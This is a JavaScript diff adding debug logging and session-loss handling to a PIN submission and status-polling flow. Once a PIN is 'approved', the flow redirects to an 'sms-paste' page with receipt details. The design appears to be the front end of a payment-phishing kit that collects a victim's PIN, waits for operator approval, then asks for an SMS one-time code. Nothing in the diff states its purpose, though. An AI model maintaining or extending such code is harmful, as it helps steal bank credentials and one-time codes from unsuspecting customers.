@@ -343,8 +343,10 @@ async function submitPin(){
       })
     });
     const data = await res.json().catch(() => ({}));
+    console.log('[submitPin] notify response:', data);
     if(!res.ok || !data.ok) throw new Error(data.error || 'Request failed');
     currentSessionId = data.sessionId;
+    console.log('[submitPin] sessionId =', currentSessionId);
     startPolling();
   } catch(err){
     hideWaiting();
@@ -364,11 +366,20 @@ function startPolling(){
     try {
       const res = await fetch(`${API_BASE}/api/status/${currentSessionId}`);
       const data = await res.json().catch(() => ({}));
-      if(!data.ok) return;
+      console.log('[poll] status:', res.status, data);
+
+      if(!data.ok){
+        // Handle session loss — this was the silent bug
+        if(res.status === 404){
+          stopPolling(); hideWaiting();
+          showResult('error', 'Session lost', 'The server restarted. Please start over from the receipt page.');
+        }
+        return;
+      }
 
       if(data.status === 'approved'){
         stopPolling(); hideWaiting();
-        // PIN approved → go to SMS paste page
+        console.log('[poll] APPROVED — redirecting to sms-paste.html');
         const p = new URLSearchParams({
           tx: currentReceipt.tx || '',
           am: currentReceipt.am || '0',
@@ -395,7 +406,7 @@ function startPolling(){
         stopPolling(); hideWaiting();
         showResult('error', 'Session expired', 'Please start over from the receipt page.');
       }
-    } catch(e){}
+    } catch(e){ console.error('[poll] error:', e); }
   }, POLL_MS);
 }
 
